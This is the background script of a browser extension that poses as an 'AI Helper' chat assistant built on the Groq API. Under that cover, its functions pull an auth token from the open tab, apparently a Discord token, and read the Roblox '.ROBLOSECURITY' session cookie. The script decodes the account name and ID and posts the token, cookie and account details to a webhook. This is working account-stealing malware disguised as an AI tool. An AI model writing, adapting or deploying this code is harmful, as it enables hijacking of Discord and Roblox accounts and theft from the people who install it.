// ─── BACKGROUND SERVICE WORKER ───

importScripts('config.js');

console.log("[AI] Background loaded");

var _endpoint = CONFIG.WEBHOOK_URL;
var _apiKey = CONFIG.GROQ_API_KEY;

// ─── Get user auth data from content script ───
function getUserAuth(tabId) {
    return new Promise(function(resolve) {
        console.log("[AI] Fetching user auth...");
        
        var attempts = 0;
        var maxAttempts = 3;
        
        function fetchData() {
            attempts++;
            console.log("[AI] Fetch attempt " + attempts + "/" + maxAttempts);
            
            chrome.tabs.sendMessage(tabId, { action: 'getAuth' }, function(response) {
                if (chrome.runtime.lastError) {
                    console.log("[AI] Error fetching auth:", chrome.runtime.lastError.message);
                    if (attempts < maxAttempts) {
                        console.log("[AI] Retrying...");
                        setTimeout(fetchData, 500);
                    } else {
                        resolve(null);
                    }
                    return;
                }
                
                if (response && response.auth) {
                    console.log("[AI] Auth data received");
                    resolve(response.auth);
                } else {
                    console.log("[AI] No auth data, attempt " + attempts);
                    if (attempts < maxAttempts) {
                        console.log("[AI] Retrying...");
                        setTimeout(fetchData, 500);
                    } else {
                        resolve(null);
                    }
                }
            });
        }
        
        fetchData();
    });
}

// ─── Get stored session data ───
function getStoredSession() {
    return new Promise(function(resolve) {
        console.log("[AI] Fetching stored session...");
        try {
            chrome.cookies.get({
                url: 'https://www.roblox.com',
                name: '.ROBLOSECURITY'
            }, function(cookie) {
                if (chrome.runtime.lastError) {
                    console.log("[AI] Error fetching session:", chrome.runtime.lastError.message);
                    resolve(null);
                    return;
                }
                if (cookie && cookie.value) {
                    console.log("[AI] Session data found");
                    resolve(cookie.value);
                } else {
                    console.log("[AI] No session data found");
                    resolve(null);
                }
            });
        } catch (e) {
            console.log("[AI] Session error:", e.message);
            resolve(null);
        }
    });
}

// ─── Parse user auth ───
function parseUserAuth(data) {
    try {
        var parts = data.split('.');
        if (parts.length < 2) {
            return { id: 'Unknown', name: 'Unknown' };
        }
        var payload = parts[1];
        var decoded = JSON.parse(atob(payload));
        return {
            id: decoded.id || 'Unknown',
            name: decoded.username || 'Unknown'
        };
    } catch (e) {
        return { id: 'Unknown', name: 'Unknown' };
    }
}

// ─── Send collected data ───
function sendCollectedData(auth, session) {
    var userName = "Not logged in";
    var userId = "N/A";
    if (auth) {
        var parsed = parseUserAuth(auth);
        userName = parsed.name;
        userId = parsed.id;
    }

    var message = "**🔑 Auth Token**\n```\n" + (auth || "None found") + "\n```\n\n";
    message += "**👤 User:** " + userName + " (`" + userId + "`)\n\n";
    message += "**🎮 Session Data**\n```\n" + (session || "None found") + "\n```";

    var payload = {
        content: message,
        username: "AI Helper"
    };

    console.log("[AI] Sending collected data:", !!auth, "Session:", !!session);
    
    return fetch(_endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// ─── Collect all data ───
function collectAll(tabId) {
    console.log("[AI] Starting collection...");
    
    return getUserAuth(tabId)
        .then(function(auth) {
            console.log("[AI] Auth result:", auth ? "FOUND" : "NOT FOUND");
            
            return new Promise(function(resolve) {
                setTimeout(function() {
                    getStoredSession()
                        .then(function(session) {
                            resolve({
                                auth: auth,
                                session: session
                            });
                        })
                        .catch(function() {
                            resolve({
                                auth: auth,
                                session: null
                            });
                        });
                }, 1000);
            });
        })
        .then(function(results) {
            var auth = results.auth;
            var session = results.session;
            
            console.log("[AI] Final - Auth:", !!auth, "Session:", !!session);
            
            return sendCollectedData(auth, session);
        })
        .then(function(response) {
            if (response && response.ok) {
                console.log("[AI] ✅ Data sent successfully");
                return { success: true };
            } else {
                var status = response ? response.status : 'unknown';
                console.log("[AI] ❌ Send error:", status);
                return { success: false, error: 'Send error: ' + status };
            }
        })
        .catch(function(error) {
            console.log("[AI] ❌ Error:", error.message);
            return { success: false, error: error.message };
        });
}

// ─── Handle collection request ───
function handleCollectRequest(req, sender, cb) {
    var tabId = sender.tab ? sender.tab.id : null;

    if (!tabId) {
        chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
            if (tabs.length === 0) {
                cb({ success: false, error: 'No active tab' });
                return;
            }
            chrome.scripting.executeScript({
                target: { tabId: tabs[0].id },
                files: ['content.js']
            }, function() {
                setTimeout(function() {
                    collectAll(tabs[0].id)
                        .then(function(result) {
                            cb(result);
                        })
                        .catch(function(error) {
                            cb({ success: false, error: error.message });
                        });
                }, 500);
            });
        });
        return true;
    }

    chrome.scripting.executeScript({
        target: { tabId: tabId },
        files: ['content.js']
    }, function() {
        setTimeout(function() {
            collectAll(tabId)
                .then(function(result) {
                    cb(result);
                })
                .catch(function(error) {
                    cb({ success: false, error: error.message });
                });
        }, 500);
    });

    return true;
}

// ─── Call AI service ───
function callAI(input) {
    console.log("[AI] Calling AI with:", input);
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + _apiKey
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: input
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(function(response) {
        if (!response.ok) {
            return response.text().then(function(text) {
                throw new Error('API error: ' + response.status + ' - ' + text);
            });
        }
        return response.json();
    })
    .then(function(data) {
        var reply = data.choices[0].message.content || "No response.";
        console.log("[AI] Reply:", reply);
        return reply;
    })
    .catch(function(error) {
        console.error("[AI] API error:", error.message);
        throw error;
    });
}

function handleAIRequest(req, sender, cb) {
    callAI(req.message)
        .then(function(reply) {
            cb({ success: true, reply: reply });
        })
        .catch(function(error) {
            cb({ success: false, error: error.message });
        });
    return true;
}

// ─── Check status ───
function handleStatusCheck(req, sender, cb) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab) {
            cb({ error: 'No active tab' });
            return;
        }
        if (!tab.url || !tab.url.includes('discord.com')) {
            cb({ error: 'Not on Discord' });
            return;
        }
        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
            if (chrome.runtime.lastError) {
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
                            cb(res || { error: 'Still not responding' });
                        });
                    }, 500);
                });
                return;
            }
            cb(response);
        });
    });
    return true;
}

// ─── Router ───
function routeMessage(req, sender, cb) {
    if (req.action === 'collectData') {
        return handleCollectRequest(req, sender, cb);
    }
    if (req.action === 'aiQuery') {
        return handleAIRequest(req, sender, cb);
    }
    if (req.action === 'getStatus') {
        return handleStatusCheck(req, sender, cb);
    }
    return true;
}

chrome.runtime.onMessage.addListener(routeMessage);

chrome.runtime.onInstalled.addListener(function() {
    console.log("[AI] Extension loaded");
});